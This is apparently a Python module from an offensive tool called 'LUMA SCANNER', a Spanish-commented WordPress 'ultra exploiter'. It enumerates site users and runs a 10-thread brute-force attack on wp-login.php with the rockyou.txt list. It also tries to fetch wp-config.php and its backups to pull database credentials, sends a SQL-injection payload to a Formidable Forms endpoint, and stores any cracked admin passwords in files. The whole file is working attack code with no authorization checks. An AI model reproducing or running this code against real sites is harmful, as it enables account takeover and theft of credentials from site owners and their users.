"""
WordpressScan.py - Módulo de escaneo de WordPress para LUMA SCANNER v5.0
"""

import os
import json
import re
import time
import zipfile
import requests
from datetime import datetime
from typing import Dict, List
from concurrent.futures import ThreadPoolExecutor, as_completed

from PySide6.QtCore import QThread, Signal
from bs4 import BeautifulSoup

from FileOrganizer import FileOrganizer
from Config import CONFIG


class WordPressUltraExploiter(QThread):
    """Explotador ULTRA agresivo para sitios WordPress"""
    
    progress_signal = Signal(int, str)
    result_signal = Signal(str, str, str, str)
    log_signal = Signal(str)
    wp_admin_signal = Signal(str, str, str)  # usuario, contraseña, URL
    
    def __init__(self, wp_url: str, options: Dict):
        super().__init__()
        self.wp_url = wp_url.rstrip('/')
        self.options = options
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = (10, 30)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        self.found_users = []
        self.found_plugins = []
        self.found_themes = []
        self.wp_config = {}
        self.admin_credentials = []
        self.database_info = {}
        self.wp_content_dumped = False
        self.vulnerabilities_found = []
        self.stop_bruteforce = False
        
        # Listas de plugins vulnerables y exploits
        self.vulnerable_plugins = self.load_vulnerable_plugins()
        self.vulnerable_themes = self.load_vulnerable_themes()
        self.common_passwords = self.load_common_passwords()
    
    def run(self):
        """Ejecutar explotación ULTRA de WordPress"""
        try:
            self.progress_signal.emit(5, "🔍 Verificando WordPress...")
            if not self.is_wordpress():
                self.log_signal.emit("❌ No es un sitio WordPress")
                return
            
            self.log_signal.emit(f"✅ WordPress detectado: {self.wp_url}")
            
            self.progress_signal.emit(10, "👥 Enumerando usuarios ULTRA...")
            self.ultra_user_enumeration()
            
            self.progress_signal.emit(25, "🔌 Enumerando plugins y temas...")
            self.enumerate_plugins_themes()
            
            self.progress_signal.emit(35, "📁 Buscando wp-config.php...")
            self.find_wp_config()
            
            self.progress_signal.emit(45, "💀 Explotando vulnerabilidades plugins...")
            self.exploit_plugin_vulnerabilities()
            
            self.progress_signal.emit(55, "🔑 Ataque de fuerza bruta ULTRA...")
            self.ultra_bruteforce()
            
            self.progress_signal.emit(65, "🗄️ Extrayendo base de datos...")
            self.extract_database_info()
            
            self.progress_signal.emit(75, "📄 Dump completo de wp-content...")
            self.dump_wp_content()
            
            self.progress_signal.emit(85, "⚡ Ataque XML-RPC...")
            self.xmlrpc_attack()
            
            self.progress_signal.emit(95, "🚀 Ataque REST API...")
            self.rest_api_attack()
            
            self.progress_signal.emit(100, "✅ WordPress ULTRA COMPLETO")
            
            self.generate_wp_report()
            
        except Exception as e:
            self.log_signal.emit(f"❌ Error WordPress: {str(e)}")
            import traceback
            traceback.print_exc()
    
    def ultra_bruteforce(self):
        """Ataque de fuerza bruta ULTRA con rockyou.txt"""
        
        # 1. Preparar usuarios
        if not self.found_users:
            self.log_signal.emit("⚠ No hay usuarios para atacar, usando usuarios por defecto")
            self.found_users = ['admin', 'administrator', 'wordpress']
        
        login_url = f"{self.wp_url}/wp-login.php"
        
        # 2. Cargar contraseñas desde rockyou.txt (con límite para velocidad)
        passwords = []
        rockyou_path = "rockyou.txt"
        zip_path = "rockyou.txt.zip"
        
        try:
            # Intentar descomprimir si el archivo de texto no existe
            if not os.path.exists(rockyou_path) and os.path.exists(zip_path):
                self.log_signal.emit("📦 Descomprimiendo rockyou.txt.zip...")
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(".")
            
            if os.path.exists(rockyou_path):
                self.log_signal.emit("📖 Leyendo contraseñas de rockyou.txt...")
                with open(rockyou_path, 'r', encoding='utf-8', errors='ignore') as f:
                    # LEER SOLO LAS PRIMERAS 50,000 LÍNEAS PARA MANTENER VELOCIDAD
                    for i, line in enumerate(f):
                        if i >= 50000:
                            break
                        password = line.strip()
                        if password:
                            passwords.append(password)
                self.log_signal.emit(f"✅ Cargadas {len(passwords)} contraseñas desde rockyou.txt")
            else:
                self.log_signal.emit("⚠ No se encontró rockyou.txt, usando lista común")
                passwords = self.load_common_passwords()[:1000]
                
        except Exception as e:
            self.log_signal.emit(f"❌ Error cargando rockyou.txt: {e}")
            self.log_signal.emit("⚠ Usando lista de contraseñas por defecto")
            passwords = self.load_common_passwords()[:500]
        
        # 3. Configurar ataque multihilo
        users_to_attack = self.found_users[:3]
        self.log_signal.emit(f"⚡ INICIANDO FUERZA BRUTA MULTIHILO...")
        self.log_signal.emit(f"   👥 Usuarios: {len(users_to_attack)}")
        self.log_signal.emit(f"   🔑 Contraseñas: {len(passwords)}")
        self.log_signal.emit(f"   🚀 Hilos concurrentes: 10")
        
        # Variables para controlar la ejecución
        self.stop_bruteforce = False
        found_credential = None
        
        def try_login(username, password):
            """Función que intenta login (ejecutada por cada hilo)"""
            if self.stop_bruteforce:
                return None
            
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': 'Mozilla/5.0'})
                session.verify = False
                
                # Obtener cookies iniciales
                session.get(login_url, timeout=2)
                
                # Datos para el login
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{self.wp_url}/wp-admin/",
                    'testcookie': '1'
                }
                
                # Enviar solicitud de login
                response = session.post(
                    login_url, 
                    data=login_data, 
                    timeout=5,
                    allow_redirects=True
                )
                
                # Verificar si el login fue exitoso
                success_indicators = [
                    'wp-admin', 'dashboard', 'profile.php',
                    'logout', 'admin-ajax.php', 'wp-admin/'
                ]
                
                for indicator in success_indicators:
                    if indicator in response.url.lower() or indicator in response.text.lower():
                        return (username, password, response.url)
                        
            except Exception as e:
                pass
            finally:
                try:
                    session.close()
                except:
                    pass
            return None
        
        # 4. Ejecutar con ThreadPoolExecutor (PARALELO)
        try:
            with ThreadPoolExecutor(max_workers=10) as executor:
                # Crear todas las tareas (combinaciones usuario-contraseña)
                future_to_cred = {}
                for username in users_to_attack:
                    for password in passwords:
                        if self.stop_bruteforce:
                            break
                        future = executor.submit(try_login, username, password)
                        future_to_cred[future] = (username, password)
                
                # Procesar resultados conforme van llegando
                for future in as_completed(future_to_cred):
                    if self.stop_bruteforce:
                        break
                        
                    result = future.result()
                    if result:
                        username, password, redirect_url = result
                        found_credential = (username, password)
                        self.stop_bruteforce = True
                        
                        # Guardar credencial encontrada
                        self.admin_credentials.append({
                            'username': username,
                            'password': password,
                            'url': self.wp_url
                        })
                        
                        # Reportar el hallazgo
                        self.report_finding(
                            'WP_ADMIN_CRACKED_ROCKYOU',
                            'CRITICAL',
                            login_url,
                            f"🚨 ADMIN CRACKED CON ROCKYOU.TXT: {username}:{password}",
                            {
                                'username': username,
                                'password': password,
                                'redirect': redirect_url,
                                'source': 'rockyou.txt'
                            }
                        )
                        
                        # Emitir señal
                        self.wp_admin_signal.emit(username, password, self.wp_url)
                        
                        # Guardar archivo
                        self.save_admin_credentials(username, password)
                        
                        self.log_signal.emit(f"💥 CREDENCIAL ENCONTRADA: {username}:{password}")
                        break
                        
        except Exception as e:
            self.log_signal.emit(f"⚠ Error en fuerza bruta multihilo: {e}")
        
        # 5. Resultado final
        if found_credential:
            self.log_signal.emit(f"✅ Fuerza bruta COMPLETADA - Credencial encontrada!")
        else:
            self.log_signal.emit("⚠ Fuerza bruta COMPLETADA - No se encontraron credenciales")

    def is_wordpress(self) -> bool:
        """Verificar si es WordPress"""
        try:
            response = self.session.get(self.wp_url, timeout=10)
            
            # Patrones WordPress
            wp_indicators = [
                'wp-content', 'wp-includes', 'wordpress',
                'wp-json', 'xmlrpc.php', '/wp-admin/',
                'wp-embed.min.js', 'wp-emoji-release.min.js'
            ]
            
            for indicator in wp_indicators:
                if indicator in response.text.lower():
                    return True
            
            # Probar wp-login.php
            login_url = f"{self.wp_url}/wp-login.php"
            response = self.session.get(login_url, timeout=5)
            if response.status_code == 200 and 'wordpress' in response.text.lower():
                return True
            
            # Probar readme.html
            readme_url = f"{self.wp_url}/readme.html"
            response = self.session.get(readme_url, timeout=5)
            if response.status_code == 200 and 'wordpress' in response.text.lower():
                return True
                
            return False
            
        except:
            return False

    def ultra_user_enumeration(self):
        """Enumeración ULTRA de usuarios de WordPress"""
        methods = [
            self.enumerate_via_author_pages,
            self.enumerate_via_wp_json,
            self.enumerate_via_rss,
            self.enumerate_via_sitemap,
            self.enumerate_via_rest_api,
        ]
        
        for method in methods:
            try:
                method()
                time.sleep(0.3)
            except:
                continue
        
        self.log_signal.emit(f"✅ Usuarios encontrados: {len(self.found_users)}")
        for user in self.found_users:
            self.log_signal.emit(f"   👤 {user}")

    def enumerate_via_author_pages(self):
        """Enumerar usuarios por páginas de autor"""
        for i in range(1, 50):
            url = f"{self.wp_url}/?author={i}"
            try:
                response = self.session.get(url, allow_redirects=False, timeout=5)
                
                if response.status_code in [301, 302]:
                    location = response.headers.get('location', '')
                    if '/author/' in location:
                        username = location.split('/author/')[-1].strip('/')
                        if username and username not in self.found_users:
                            self.found_users.append(username)
            except:
                continue

    def enumerate_via_wp_json(self):
        """Enumerar usuarios via WP JSON API"""
        url = f"{self.wp_url}/wp-json/wp/v2/users"
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                users = response.json()
                for user in users:
                    username = user.get('slug') or user.get('name')
                    if username and username not in self.found_users:
                        self.found_users.append(username)
        except:
            pass

    def enumerate_via_rss(self):
        """Enumerar usuarios via RSS feed"""
        rss_urls = [
            f"{self.wp_url}/feed/",
            f"{self.wp_url}/feed/rss2/",
        ]
        
        for url in rss_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    # Buscar autores en RSS
                    soup = BeautifulSoup(response.text, 'lxml-xml')
                    
                    # Buscar <dc:creator>
                    creators = soup.find_all('dc:creator')
                    for creator in creators:
                        username = creator.text.strip()
                        if username and username not in self.found_users:
                            self.found_users.append(username)
            except:
                continue

    def enumerate_via_sitemap(self):
        """Enumerar usuarios via sitemap"""
        sitemap_urls = [
            f"{self.wp_url}/wp-sitemap.xml",
            f"{self.wp_url}/wp-sitemap-users-1.xml",
        ]
        
        for url in sitemap_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'xml')
                    urls = soup.find_all('loc')
                    for url_tag in urls:
                        url_text = url_tag.text
                        if '/author/' in url_text:
                            username = url_text.split('/author/')[-1].strip('/')
                            if username and username not in self.found_users:
                                self.found_users.append(username)
            except:
                continue

    def enumerate_via_rest_api(self):
        """Enumerar usuarios via REST API"""
        url = f"{self.wp_url}/wp-json/wp/v2/users"
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    for user in data:
                        username = user.get('slug')
                        if username and username not in self.found_users:
                            self.found_users.append(username)
        except:
            pass

    def enumerate_plugins_themes(self):
        """Enumerar plugins y temas"""
        # Listas comunes de plugins y temas
        common_plugins = [
            'akismet', 'contact-form-7', 'yoast-seo', 'woocommerce',
            'elementor', 'all-in-one-seo-pack', 'wordfence', 'jetpack',
            'revslider', 'visual-composer', 'formidable', 'wp-super-cache',
            'nextgen-gallery', 'updraftplus', 'duplicator'
        ]
        
        common_themes = [
            'twentytwentyone', 'twentytwenty', 'astra', 'generatepress',
            'oceanwp', 'avada', 'divi', 'newspaper', 'flatsome', 'the7'
        ]
        
        # Verificar plugins
        for plugin in common_plugins:
            url = f"{self.wp_url}/wp-content/plugins/{plugin}/"
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200 or response.status_code == 403:
                    if plugin not in self.found_plugins:
                        self.found_plugins.append(plugin)
            except:
                continue
        
        # Verificar temas
        for theme in common_themes:
            url = f"{self.wp_url}/wp-content/themes/{theme}/"
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200 or response.status_code == 403:
                    if theme not in self.found_themes:
                        self.found_themes.append(theme)
            except:
                continue
        
        self.log_signal.emit(f"✅ Plugins encontrados: {len(self.found_plugins)}")
        self.log_signal.emit(f"✅ Temas encontrados: {len(self.found_themes)}")

    def find_wp_config(self):
        """Buscar y extraer wp-config.php"""
        config_urls = [
            f"{self.wp_url}/wp-config.php",
            f"{self.wp_url}/wp-config.php.bak",
            f"{self.wp_url}/wp-config.php.save",
            f"{self.wp_url}/wp-config-sample.php",
            f"{self.wp_url}/../wp-config.php",
        ]
        
        for url in config_urls:
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and '<?php' in response.text:
                    content = response.text
                    
                    # Buscar credenciales de base de datos
                    db_patterns = {
                        'DB_NAME': r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)",
                        'DB_USER': r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)",
                        'DB_PASSWORD': r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)",
                        'DB_HOST': r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)",
                    }
                    
                    config_data = {}
                    for key, pattern in db_patterns.items():
                        match = re.search(pattern, content, re.IGNORECASE)
                        if match:
                            config_data[key] = match.group(1)
                    
                    if config_data:
                        self.wp_config = config_data
                        self.log_signal.emit(f"📁 wp-config.php encontrado!")
                        return True
                        
            except:
                continue
        
        return False

    def exploit_plugin_vulnerabilities(self):
        """Explotar vulnerabilidades conocidas de plugins"""
        if 'revslider' in self.found_plugins:
            self.exploit_revslider()
        
        if 'formidable' in self.found_plugins:
            self.exploit_formidable()
        
        if 'avada' in self.found_themes:
            self.exploit_avada_theme()

    def exploit_revslider(self):
        """Explotar vulnerabilidad RevSlider"""
        url = f"{self.wp_url}/wp-admin/admin-ajax.php"
        payload = {
            'action': 'revslider_ajax_action',
            'client_action': 'get_script'
        }
        
        try:
            response = self.session.post(url, data=payload, timeout=10)
            if response.status_code == 200 and 'error' not in response.text.lower():
                self.log_signal.emit("⚠ Posible vulnerabilidad RevSlider detectada")
        except:
            pass

    def exploit_formidable(self):
        """Explotar SQL Injection en Formidable Forms"""
        url = f"{self.wp_url}/wp-admin/admin-ajax.php"
        payload = {
            'action': 'frm_entries_list',
            'search': "' OR '1'='1"
        }
        
        try:
            response = self.session.post(url, data=payload, timeout=10)
            if response.status_code == 200:
                self.log_signal.emit("⚠ Posible SQLi en Formidable Forms")
        except:
            pass

    def exploit_avada_theme(self):
        """Explotar vulnerabilidades en tema Avada"""
        url = f"{self.wp_url}/wp-content/themes/avada/fusion-core/templates/avada-my-account.php"
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                self.log_signal.emit("⚠ Tema Avada detectado (posibles vulnerabilidades conocidas)")
        except:
            pass

    def load_common_passwords(self):
        """Cargar lista de contraseñas comunes"""
        return [
            'admin', 'admin123', 'password', '123456', 'password123',
            'admin@123', 'qwerty', 'letmein', 'welcome', 'monkey',
            '123456789', '12345678', '12345', '1234', '123',
            'wordpress', 'wpadmin', 'administrator', 'root',
            'test', 'demo', 'user', 'guest', 'info',
            '2020', '2021', '2022', '2023', '2024',
            'company', 'business', 'website', 'web',
            'pass', 'pass123', 'admin1234', 'adminadmin',
            'superadmin', 'manager', 'login', 'secret',
            'abc123', 'qwerty123', 'admin123!', 'P@ssw0rd',
            'Admin123', 'Admin@123', 'Wordpress123',
            'password1', '123123', '1234567', '1234567890',
            '123qwe', '111111', 'password1234', 'admin123456'
        ]

    def extract_database_info(self):
        """Extraer información de la base de datos"""
        if not self.wp_config:
            return
        
        self.log_signal.emit(f"🗄️ Configuración DB encontrada:")
        for key, value in self.wp_config.items():
            self.log_signal.emit(f"   • {key}: {value}")

    def dump_wp_content(self):
        """Hacer dump de directorio wp-content"""
        directories = [
            'wp-content/uploads/',
            'wp-content/plugins/',
            'wp-content/themes/',
        ]
        
        for directory in directories:
            url = f"{self.wp_url}/{directory}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and 'Index of' in response.text:
                    self.log_signal.emit(f"📁 Directory listing en: {directory}")
            except:
                continue

    def xmlrpc_attack(self):
        """Ataque a XML-RPC de WordPress"""
        xmlrpc_url = f"{self.wp_url}/xmlrpc.php"
        
        try:
            response = self.session.get(xmlrpc_url, timeout=5)
            if response.status_code == 200 and 'XML-RPC' in response.text:
                self.log_signal.emit("⚠ XML-RPC habilitado (vulnerable a brute force)")
        except:
            pass

    def rest_api_attack(self):
        """Ataque a REST API de WordPress"""
        api_url = f"{self.wp_url}/wp-json/"
        
        try:
            response = self.session.get(api_url, timeout=5)
            if response.status_code == 200:
                self.log_signal.emit("✅ REST API habilitado")
                try:
                    data = response.json()
                    if 'routes' in data:
                        self.log_signal.emit(f"   • Endpoints disponibles: {len(data['routes'])}")
                except:
                    pass
        except:
            pass

    def report_finding(self, finding_type: str, severity: str, target: str, details: str, extra_data: Dict = None):
        """Reportar hallazgo"""
        self.result_signal.emit(finding_type, severity, target, details)
        
        # Guardar en archivo
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{finding_type}_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
            filepath = os.path.join("SCAN_RESULTS", "WORDPRESS", filename)
            
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            report = {
                'type': finding_type,
                'severity': severity,
                'target': target,
                'details': details,
                'timestamp': datetime.now().isoformat(),
                'extra_data': extra_data or {}
            }
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
                
            self.log_signal.emit(f"📁 Hallazgo guardado: {os.path.basename(filepath)}")
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error guardando hallazgo: {e}")

    def save_admin_credentials(self, username: str, password: str):
        """Guardar credenciales de admin encontradas"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_url = self.wp_url.replace('://', '_').replace('/', '_')
            filename = f"wp_admin_{safe_url}_{timestamp}.txt"
            filepath = os.path.join("SCAN_RESULTS", "WORDPRESS", "ADMIN_CREDENTIALS", filename)
            
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"WORDPRESS ADMIN CREDENTIALS\n")
                f.write(f"="*60 + "\n")
                f.write(f"URL: {self.wp_url}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write(f"\nLogin URL: {self.wp_url}/wp-login.php\n")
                f.write(f"Admin URL: {self.wp_url}/wp-admin/\n")
            
            self.log_signal.emit(f"💾 Credenciales guardadas: {filepath}")
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error guardando credenciales: {e}")

    def generate_wp_report(self):
        """Generar reporte completo de WordPress"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_url = self.wp_url.replace('://', '_').replace('/', '_')
            report_dir = os.path.join("SCAN_RESULTS", "WORDPRESS", "REPORTS")
            os.makedirs(report_dir, exist_ok=True)
            
            # Reporte JSON
            report_data = {
                'target': self.wp_url,
                'scan_date': datetime.now().isoformat(),
                'found_users': self.found_users,
                'found_plugins': self.found_plugins,
                'found_themes': self.found_themes,
                'admin_credentials': self.admin_credentials,
                'wp_config': self.wp_config,
            }
            
            json_path = os.path.join(report_dir, f"{safe_url}_report.json")
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=2, ensure_ascii=False)
            
            # Reporte de texto
            text_path = os.path.join(report_dir, f"{safe_url}_summary.txt")
            with open(text_path, 'w', encoding='utf-8') as f:
                f.write(f"WORDPRESS ULTRA EXPLOIT REPORT\n")
                f.write(f"="*60 + "\n")
                f.write(f"Target: {self.wp_url}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"\n📊 SUMMARY:\n")
                f.write(f"• Users found: {len(self.found_users)}\n")
                f.write(f"• Plugins found: {len(self.found_plugins)}\n")
                f.write(f"• Themes found: {len(self.found_themes)}\n")
                f.write(f"• Admin cracked: {len(self.admin_credentials)}\n")
                f.write(f"\n👥 USERS:\n")
                for user in self.found_users:
                    f.write(f"  - {user}\n")
                f.write(f"\n🔌 PLUGINS:\n")
                for plugin in self.found_plugins:
                    f.write(f"  - {plugin}\n")
                f.write(f"\n🎨 THEMES:\n")
                for theme in self.found_themes:
                    f.write(f"  - {theme}\n")
                if self.admin_credentials:
                    f.write(f"\n🚨 CRACKED CREDENTIALS:\n")
                    for cred in self.admin_credentials:
                        f.write(f"  - {cred['username']}:{cred['password']}\n")
            
            self.log_signal.emit(f"📄 Reportes guardados en: {report_dir}")
            
            # Resumen final
            self.log_signal.emit(f"\n{'='*60}")
            self.log_signal.emit(f"✅ WORDPRESS SCAN COMPLETADO")
            self.log_signal.emit(f"👥 Users: {len(self.found_users)}")
            self.log_signal.emit(f"🔌 Plugins: {len(self.found_plugins)}")
            self.log_signal.emit(f"🎨 Themes: {len(self.found_themes)}")
            self.log_signal.emit(f"🚨 Admin Cracked: {len(self.admin_credentials)}")
            self.log_signal.emit(f"{'='*60}")
            
        except Exception as e:
            self.log_signal.emit(f"⚠ Error generando reporte: {str(e)}")

    def load_vulnerable_plugins(self):
        """Cargar lista de plugins vulnerables"""
        return ['revslider', 'formidable', 'woocommerce', 'elementor']

    def load_vulnerable_themes(self):
        """Cargar lista de temas vulnerables"""
        return ['avada', 'newspaper', 'the7']